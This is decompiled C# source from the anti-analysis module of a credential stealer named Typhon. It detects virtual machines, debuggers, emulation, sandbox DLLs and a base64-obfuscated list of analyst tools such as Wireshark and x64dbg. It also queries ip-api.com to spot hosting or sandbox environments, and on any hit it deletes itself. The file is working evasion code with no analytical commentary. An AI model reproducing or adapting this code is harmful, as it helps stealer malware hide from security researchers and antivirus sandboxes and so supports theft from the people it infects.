using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Typhon.Modules.Blacklist;
using Typhon.Stealer.SystemInfo;

namespace Typhon.Modules.Implants
{
	// Token: 0x0200005F RID: 95
	internal class AntiAnalysis
	{
		// Token: 0x06000235 RID: 565
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		// Token: 0x06000236 RID: 566
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x06000237 RID: 567 RVA: 0x0000C9A0 File Offset: 0x0000ABA0
		private static bool IsSmallDisk()
		{
			if (UserDetails.GetSystemVersion().Contains("Windows 11"))
			{
				try
				{
					long num = 70000000000L;
					if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
					{
						return true;
					}
				}
				catch
				{
				}
				return false;
			}
			if (UserDetails.GetSystemVersion().Contains("Windows 10"))
			{
				try
				{
					long num2 = 30000000000L;
					if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num2)
					{
						return true;
					}
				}
				catch
				{
				}
				return false;
			}
			if (UserDetails.GetSystemVersion().Contains("Windows 7"))
			{
				try
				{
					long num3 = 30000000000L;
					if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num3)
					{
						return true;
					}
				}
				catch
				{
				}
				return false;
			}
			return false;
		}

		// Token: 0x06000238 RID: 568 RVA: 0x0000CA94 File Offset: 0x0000AC94
		private static bool IsDebuggedCLI()
		{
			return !string.Join(" ", Environment.GetCommandLineArgs()).ToLower().Contains("--debug");
		}

		// Token: 0x06000239 RID: 569 RVA: 0x0000CABC File Offset: 0x0000ACBC
		private static bool IsDebuggerAttached()
		{
			bool flag = false;
			bool result;
			try
			{
				AntiAnalysis.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag);
				result = flag;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600023A RID: 570 RVA: 0x0000CAF8 File Offset: 0x0000ACF8
		private static bool IsVirtualMachine()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600023B RID: 571 RVA: 0x0000CCA4 File Offset: 0x0000AEA4
		private static bool IsEmulated()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600023C RID: 572 RVA: 0x0000CCF8 File Offset: 0x0000AEF8
		private static bool IsBlacklistedDLLsPresent()
		{
			string[] array = new string[]
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("U2JpZURsbC5kbGw=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("U3hJbi5kbGw=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("U2YyLmRsbA==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("c254aGsuZGxs")),
				Encoding.UTF8.GetString(Convert.FromBase64String("Y21kdnJ0MzIuZGxs"))
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (AntiAnalysis.GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600023D RID: 573 RVA: 0x0000CDA4 File Offset: 0x0000AFA4
		public static bool IsBlacklistedProcessRunning()
		{
			Process[] processes = Process.GetProcesses();
			string[] array = new string[]
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("b2xseWRiZy5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("cHJvY2Vzc2hhY2tlci5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("dGNwdmlldy5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("YXV0b3J1bnMuZXhl")),
				Encoding.UTF8.GetString(Convert.FromBase64String("ZGU0ZG90LmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("aWxzcHkuZXhl")),
				Encoding.UTF8.GetString(Convert.FromBase64String("ZG5zcHkuZXhl")),
				Encoding.UTF8.GetString(Convert.FromBase64String("YXV0b3J1bnNjLmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("ZmlsZW1vbi5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("cHJvY21vbi5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("cmVnbW9uLmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("aWRhcS5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("aWRhcTY0LmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("aW1tdW5pdHlkZWJ1Z2dlci5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("d2lyZXNoYXJrLmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("ZHVtcGNhcC5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("aG9va2V4cGxvcmVyLmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("bG9yZHBlLmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("cGV0b29scy5leGU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("cmVzb3VyY2VoYWNrZXIuZXhl")),
				Encoding.UTF8.GetString(Convert.FromBase64String("eDMyZGJnLmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("eDY0ZGJnLmV4ZQ==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("ZmlkZGxlci5leGU="))
			};
			foreach (Process process in processes)
			{
				foreach (string value in array)
				{
					if (SaveRunningProcess.GetProcessExecutablePath(process).ToLower().Contains(value))
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x0600023E RID: 574 RVA: 0x0000D028 File Offset: 0x0000B228
		private static bool VTOrAnyRUNDetect()
		{
			try
			{
				return new WebClient().DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovL2lwLWFwaS5jb20vbGluZS8/ZmllbGRzPWhvc3Rpbmc="))).Contains("true");
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600023F RID: 575 RVA: 0x0000D078 File Offset: 0x0000B278
		public static void RunAntiAnalysisCheck()
		{
			if (AntiAnalysis.VTOrAnyRUNDetect())
			{
				SelfDestruct.MeltSelf();
			}
			if (AntiAnalysis.IsBlacklistedDLLsPresent())
			{
				SelfDestruct.MeltSelf();
			}
			if (AntiAnalysis.IsVirtualMachine())
			{
				SelfDestruct.MeltSelf();
			}
			if (AntiAnalysis.IsDebuggerAttached())
			{
				SelfDestruct.MeltSelf();
			}
			if (AntiAnalysis.IsEmulated())
			{
				SelfDestruct.MeltSelf();
			}
			if (AntiAnalysis.IsDebuggedCLI())
			{
				SelfDestruct.MeltSelf();
			}
			if (AntiAnalysis.IsSmallDisk())
			{
				SelfDestruct.MeltSelf();
			}
			if (BlacklistedUsernames.AntiAnalysisBU())
			{
				SelfDestruct.MeltSelf();
			}
			if (AntiAnalysis.IsBlacklistedProcessRunning())
			{
				SelfDestruct.MeltSelf();
			}
		}
	}
}
